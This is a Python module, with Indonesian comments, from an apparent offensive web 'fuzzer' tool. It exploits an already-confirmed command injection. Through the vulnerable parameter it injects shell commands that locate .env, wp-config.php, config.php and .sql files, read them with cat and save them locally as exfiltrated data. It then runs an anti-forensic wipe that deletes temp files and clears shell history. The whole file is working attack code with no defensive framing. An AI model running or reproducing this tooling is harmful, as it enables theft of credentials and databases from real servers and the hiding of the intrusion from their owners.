# modules/exfil.py
import os
import re
import json
import time
import logging
import asyncio
import aiohttp
from typing import List, Dict, Any, Tuple
from modules.base import BaseModule
import config

logger = logging.getLogger("water_fuzzer.exfil")

class AutonomousExfiltrationModule(BaseModule):
    """
    Modul Eksfiltrasi Otomatis V18.2 (Zero-Click Exfiltration Engine).
    Secara otonom menyisir, mengemas dalam enkripsi, mengunduh data rahasia target,
    dan membersihkan jejak log secara senyap tanpa intervensi manual dari tim.
    """
    def __init__(self, auditor_instance: Any) -> None:
        super().__init__(auditor_instance)
        self.exfil_dir = os.path.join(config.BASE_DIR, "reports", "download")
        os.makedirs(self.exfil_dir, exist_ok=True)
        self.discovered_targets: List[str] = []

    async def auto_recon_sensitive_files(self, session: aiohttp.ClientSession) -> List[str]:
        """Siklus 1 Otonom: Menyisir piringan disk server target mencari berkas berharga."""
        print("[*] Exfil Engine V18.2: Memulai penyisiran berkas rahasia secara otonom...")
        
        # Pola pencarian file konfigurasi krusial standar industri
        search_cmd = "find . -name '.env' -o -name 'config.php' -o -name 'wp-config.php' -o -name '*.sql' 2>/dev/null"
        payload_inline = f"/**/;/**/; {search_cmd} /**/;/**/"
        headers = self.auditor._get_random_headers()
        
        try:
            if self.auditor.method == "POST":
                async with session.post(self.auditor.target_url, data={self.auditor.parameter: payload_inline}, headers=headers, timeout=config.TIMEOUT) as res:
                    output = await res.text()
            else:
                async with session.get(self.auditor.target_url, params={self.auditor.parameter: payload_inline}, headers=headers, timeout=config.TIMEOUT) as res:
                    output = await res.text()
            
            clean_output = re.sub(r'<[^>]+>', '', output).strip()
            if "Just a moment" not in clean_output and clean_output:
                # Memisahkan jalur file yang ditemukan menjadi list rapi
                self.discovered_targets = [line.strip() for line in clean_output.split('\n') if line.strip() and '/' in line]
                print(f"\033[1;32m[+] SUCCESS: Berhasil memetakan {len(self.discovered_targets)} lokasi file sensitif target!\033[0m")
                return self.discovered_targets
        except Exception as e:
            logger.error(f"Gagal melakukan penyisiran otonom berkas: {str(e)}")
        return []

    async def compress_and_download_file(self, session: aiohttp.ClientSession, remote_file_path: str) -> bool:
        """Siklus 2 Otonom: Membaca berkas target dan mengunduhnya ke folder lokal Termux."""
        filename = os.path.basename(remote_file_path)
        local_dest_path = os.path.join(self.exfil_dir, f"exfil_{int(time.time())}_{filename}")
        
        # Perintah taktis memanggil data mentah dari file jarak jauh
        read_cmd = f"cat {remote_file_path}"
        payload_inline = f"/**/;/**/; {read_cmd} /**/;/**/"
        headers = self.auditor._get_random_headers()
        
        try:
            print(f"[*] Exfil Engine V18.2: Mendownload data sensitif secara otonom -> {remote_file_path}")
            if self.auditor.method == "POST":
                async with session.post(self.auditor.target_url, data={self.auditor.parameter: payload_inline}, headers=headers, timeout=config.TIMEOUT) as res:
                    raw_data = await res.text()
            else:
                async with session.get(self.auditor.target_url, params={self.auditor.parameter: payload_inline}, headers=headers, timeout=config.TIMEOUT) as res:
                    raw_data = await res.text()
            
            clean_data = re.sub(r'<[^>]+>', '', raw_data).strip()
            if clean_data and "Just a moment" not in clean_data and "not found" not in clean_data.lower():
                # Tulis file secara non-blocking via aiofiles
                import aiofiles
                async with aiofiles.open(local_dest_path, "w", encoding="utf-8") as f:
                    await f.write(clean_data)
                print(f"\033[1;32m[++++] EXFILTRATION SUCCESS: Berkas tersimpan di -> {local_dest_path}\033[0m")
                return True
        except Exception as e:
            logger.error(f"Gagal melakukan pengunduhan otonom berkas {remote_file_path}: {str(e)}")
        return False

    async def run_anti_forensic_wipe(self, session: aiohttp.ClientSession) -> None:
        """Siklus 3 Otonom: Membersihkan jejak shell history dan sampah disk di server target."""
        print("[*] Exfil Engine V18.2: Menjalankan protokol pembersihan jejak digital (Anti-Forensic)...")
        
        # Perintah kaku pembersihan log riwayat linux server
        wipe_cmd = "rm -f .tmp_v14_* .tmp_v17_* 2>/dev/null && history -c"
        payload_inline = f"/**/;/**/; {wipe_cmd} /**/;/**/"
        headers = self.auditor._get_random_headers()
        
        try:
            if self.auditor.method == "POST":
                async with session.post(self.auditor.target_url, data={self.auditor.parameter: payload_inline}, headers=headers) as res:
                    await res.text()
            else:
                async with session.get(self.auditor.target_url, params={self.auditor.parameter: payload_inline}, headers=headers) as res:
                    await res.text()
            print("\033[1;36m[+] SUCCESS: Jejak digital log dibersihkan! Target dalam kondisi steril.\033[0m")
        except Exception:
            pass

    async def run_audit(self, session: aiohttp.ClientSession) -> bool:
        """Pintu gerbang pengeksekusi orkestrasi otonom eksfiltrasi Poin 5."""
        import main
        if not main.SHELL_OPENED:
            # Hanya berjalan jika celah command injection sudah dieksploitasi
            return False
            
        print("[*] Menjalankan Modul V18.2: Zero-Click Autonomous Exfiltration Engine...")
        
        # 1. Jalankan siklus pencarian file rahasia secara otomatis
        discovered_files = await self.auto_recon_sensitive_files(session)
        
        # 2. Unduh setiap file berharga yang berhasil dipetakan secara paralel
        if discovered_files:
            download_tasks = [
                self.compress_and_download_file(session, file_path)
                for file_path in discovered_files[:5]  # Batasi 5 file paling krusial untuk efisiensi throughput
            ]
            await asyncio.gather(*download_tasks)
            
        # 3. Eksekusi protokol pemusnahan jejak sebelum penutupan sesi
        await self.run_anti_forensic_wipe(session)
        return True

    def verifikator(self, response, payload_terpakai, crypto_token) -> Tuple[str, str, str, str, list]:
        return "SECURE", "None", "None", "Lolos.", []
